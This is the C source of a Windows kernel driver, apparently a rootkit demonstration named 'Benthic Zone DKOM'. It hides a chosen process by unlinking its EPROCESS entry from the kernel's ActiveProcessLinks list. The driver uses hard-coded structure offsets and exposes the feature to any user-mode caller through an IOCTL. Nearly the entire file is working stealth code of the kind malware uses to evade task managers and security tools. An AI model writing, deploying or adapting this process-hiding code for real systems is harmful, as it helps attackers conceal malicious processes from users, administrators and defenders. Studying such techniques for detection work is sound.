#include <ntddk.h>

#include <wdm.h>


/**
	@brief		An I/O control code is a 32-bit value that consists of several fields (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes).

	@details	When defining new IOCTLs, it is important to remember the following rules:
	@details		- If a new IOCTL will be available to user-mode software components, the IOCTL must be used with IRP_MJ_DEVICE_CONTROL requests. User-mode components send IRP_MJ_DEVICE_CONTROL requests by calling the DeviceIoControl, which is a Win32 function.
	@details		- If a new IOCTL will be available only to kernel-mode driver components, the IOCTL must be used with IRP_MJ_INTERNAL_DEVICE_CONTROL requests. Kernel-mode components create IRP_MJ_INTERNAL_DEVICE_CONTROL requests by calling IoBuildDeviceIoControlRequest.

	@details	Use the system-supplied CTL_CODE macro, which is defined in Wdm.h and Ntddk.h, to define new I/O control codes. The definition of a new IOCTL code, whether intended for use with IRP_MJ_DEVICE_CONTROL or IRP_MJ_INTERNAL_DEVICE_CONTROL requests, uses the following format:
	@details		#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)

	@details	Supply the following parameters to the CTL_CODE macro:
	@param			DeviceType			This value must match the value that is set in the DeviceType member of the driver's DEVICE_OBJECT structure (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types).
	@param			FunctionCode		Identifies the function to be performed by the driver. Values of less than 0x800 are reserved for Microsoft. Values of 0x800 and higher can be used by vendors.
	@param			TransferType		Indicates how the system will pass data between the caller of DeviceIoControl (or IoBuildDeviceIoControlRequest) and the driver that handles the IRP (METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, METHOD_NEITHER).
	@param			RequiredAccess		Indicates the type of access that a caller must request when opening the file object that represents the device (FILE_ANY_ACCESS, FILE_READ_DATA, FILE_READ_DATA, FILE_READ_DATA and FILE_WRITE_DATA).
**/
#define IOCTL_HIDE_PROCESS_BY_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Device name and symbolic link
UNICODE_STRING Global_Device_Name;
UNICODE_STRING Global_Device_Symbolic_Link;


/**
	@brief		Removes a process from the ActiveProcessLinks list in the Windows kernel's EPROCESS structure.


	@see		PLIST_ENTRY				
	@param[in]	currListEntry			
**/
VOID
DirectKernelObjectModification_UnlinkProcessEntry(
	_In_		PLIST_ENTRY				currListEntry
)
{

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_UnlinkProcessEntry) - Hello");

	PLIST_ENTRY prevListEntry, nextListEntry;
	prevListEntry = (currListEntry->Blink);
	nextListEntry = (currListEntry->Flink);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_UnlinkProcessEntry) - Update the forward pointer of the previous process and the backward pointer of the next process");
	prevListEntry->Flink = nextListEntry;
	nextListEntry->Blink = prevListEntry;

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_UnlinkProcessEntry) - Self-reference the current LIST_ENTRY to prevent BSOD by avoiding dangling pointers");
	currListEntry->Blink = (PLIST_ENTRY)&currListEntry->Flink;
	currListEntry->Flink = (PLIST_ENTRY)&currListEntry->Flink;

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_UnlinkProcessEntry) - Bye");
	return;
}



/**
	@brief		 Walks through the ActiveProcessLinks list to find and hide a process by its PID.


	@see		UINT32					
	@param[in]	pid						


	@return		TRUE if the process was found and hidden, FALSE otherwise.
**/
BOOLEAN
DirectKernelObjectModification_WarningOffsetsHideProcessByPID(
	_In_		UINT32					pid
)
{
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Hello");


	// Process found flag
	BOOLEAN foundProcess = FALSE;
	
	
	UINT32* currUniqueProcessId = NULL;
	// Offset for EPROCESS ActiveProcessLinks field
	ULONG_PTR EPROCESSS_ActiveProcessLinksOffset = 0x448;
	// Offset for EPROCESS UniqueProcessId field
	ULONG_PTR EPROCESS_UniqueProcessIdOffset = 0x440;

	// Get pointer to current process
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Get pointer to current process");

	// The IoGetCurrentProcess routine returns a pointer to the current process.
	PEPROCESS currProcess = PsGetCurrentProcess();

	// Calculate pointers to doubly-linked list entries
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Calculate pointers to doubly-linked list entries");

	// List entries
	PLIST_ENTRY currListEntry = (PLIST_ENTRY)((PUCHAR)currProcess + EPROCESSS_ActiveProcessLinksOffset);
	PLIST_ENTRY prevListEntry = currListEntry->Blink;
	PLIST_ENTRY nextListEntry = NULL;


	// Loop through doubly-linked list of processes
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Loop through doubly-linked list of processes");

	while (currListEntry != prevListEntry)
	{
		nextListEntry = currListEntry->Flink;

		currUniqueProcessId = (UINT32*)(((ULONG_PTR)currListEntry - EPROCESSS_ActiveProcessLinksOffset) + EPROCESS_UniqueProcessIdOffset);

		if (*(UINT32*)currUniqueProcessId == pid && MmIsAddressValid(currListEntry))
		{
			foundProcess = TRUE;

			//DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Hide Process with PID %u", *currUniqueProcessId);

			DirectKernelObjectModification_UnlinkProcessEntry(currListEntry);

			break;
		}
		currListEntry = nextListEntry;
	}

	if (!foundProcess)
	{
		DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Process with PID %u was not found", pid);
	}

		DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DirectKernelObjectModification_WarningOffsetsHideProcessByPID) - Bye");

	return foundProcess;
}



/**
	@brief		Unloads a Windows kernel-mode driver.
	@details	This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload


	@see		PDRIVER_OBJECT			
	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver.
**/
VOID
DriverUnload(
	_In_		PDRIVER_OBJECT			pDriverObject
)
{
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverUnload) - Hello");

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverUnload) - Unload routine invoked");
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverUnload) - Unloading");

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverUnload) - Remove symbolic link from the system");

	IoDeleteSymbolicLink(&Global_Device_Symbolic_Link);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverUnload) - Remove device object from the system");

	IoDeleteDevice(pDriverObject->DeviceObject);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverUnload) - Bye");
}



/**
	@brief		A passthrough function for handling IRPs (I/O Request Packets).


	@see		PDEVICE_OBJECT			
	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.

	@see		PIRP				
	@param[in]	pIrp					Pointer to an IRP (I/O Request Packet) to be processed.


	@return		A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
DriverPassthrough(
	_In_		PDEVICE_OBJECT			pDeviceObject,
	_In_		PIRP					pIrp
)
{
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverPassthrough) - Hello");
	
	UNREFERENCED_PARAMETER(pDeviceObject);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverPassthrough) - Set I/O status information");

	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverPassthrough) - Complete IRP processing and indicate no increment in stack location");

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverPassthrough) - Bye");

	return STATUS_SUCCESS;
}



/**
	@brief		Handles IOCTLs (Input/Output Control) requests from userland.


	@see		PDEVICE_OBJECT			
	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.

	@see		PIRP					
	@param[in]	pIrp					Pointer to an IRP (I/O Request Packet) to be processed.


	@return		A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
DriverHandleIOCTLs(
	_In_		PDEVICE_OBJECT			pDeviceObject,
	_In_		PIRP					pIrp
)
{
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - Hello");

	UNREFERENCED_PARAMETER(pDeviceObject);

	const char* message = NULL;

	// Get current stack location in IRP
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - Get current stack location in IRP");

	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIrp);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - Get IOCTL code from IRP");

	ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;

	switch (controlCode)
	{
	case IOCTL_HIDE_PROCESS_BY_PID:

		UINT32* pid = (UINT32*)pIrp->AssociatedIrp.SystemBuffer;

		DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - Received request to hide process with PID %u\n", *pid);

		// Call the function to hide the process in the kernel
		BOOLEAN success = DirectKernelObjectModification_WarningOffsetsHideProcessByPID(*pid);

		message = success ? "Process was successfully hidden" : "No process with that PID was found";
		RtlCopyMemory(pIrp->AssociatedIrp.SystemBuffer, message, strlen(message) + 1);
		pIrp->IoStatus.Information = strlen(message) + 1;
		pIrp->IoStatus.Status = STATUS_SUCCESS;
		break;

	default:
		DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - ERROR: Invalid IOCTL request received. Code: 0x%X.\n", controlCode);
		message = "Invalid IOCTL request";
		RtlCopyMemory(pIrp->AssociatedIrp.SystemBuffer, message, strlen(message) + 1);
		pIrp->IoStatus.Information = strlen(message) + 1;
		pIrp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - Complete IRP processing and indicate no increment in stack location");

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverHandleIOCTLs) - Bye");

	return pIrp->IoStatus.Status;
}



/**
	@brief		Entry point for a Windows kernel-mode driver.
	@details	This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers


	@see		PDRIVER_OBJECT			
	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.

	@see		PUNICODE_STRING		
	@param[in]	pRegistryPath			Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.


	@return		A NTSTATUS value indicating success or an error code if initialization fails.
**/
NTSTATUS
DriverEntry(
	_In_		PDRIVER_OBJECT			pDriverObject,
	_In_		PUNICODE_STRING			pRegistryPath
)
{
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Hello");

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - DriverEntry routine invoked");
	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Loading");
	
	UNREFERENCED_PARAMETER(pRegistryPath);

	NTSTATUS status;

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Initialize device name and symbolic link");

	RtlInitUnicodeString(&Global_Device_Name, L"\\Device\\MyKernelDriverDKOM");
	RtlInitUnicodeString(&Global_Device_Symbolic_Link, L"\\DosDevices\\MyKernelDriverDKOM");

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Set DriverUnload routine");

	pDriverObject->DriverUnload = DriverUnload;

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Set MajorFunction for different IRP types");

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverPassthrough;

	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverPassthrough;

	pDriverObject->MajorFunction[IRP_MJ_READ] = DriverPassthrough;

	pDriverObject->MajorFunction[IRP_MJ_WRITE] = DriverPassthrough;

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverHandleIOCTLs;

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Create a device object");

	status = IoCreateDevice(pDriverObject, 0, &Global_Device_Name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDriverObject->DeviceObject);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - ERROR: Error creating device. Status: 0x%08X\n", status);
		return status;
	}

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Create a symbolic link for the device");

	status = IoCreateSymbolicLink(&Global_Device_Symbolic_Link, &Global_Device_Name);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - ERROR: Error creating symbolic link. Status: 0x%08X\n", status);
		return status;
	}

	DbgPrint("Benthic Zone DKOM -> KMDFDriverDKOM [Driver.c] (DriverEntry) - Bye");

	return STATUS_SUCCESS;
}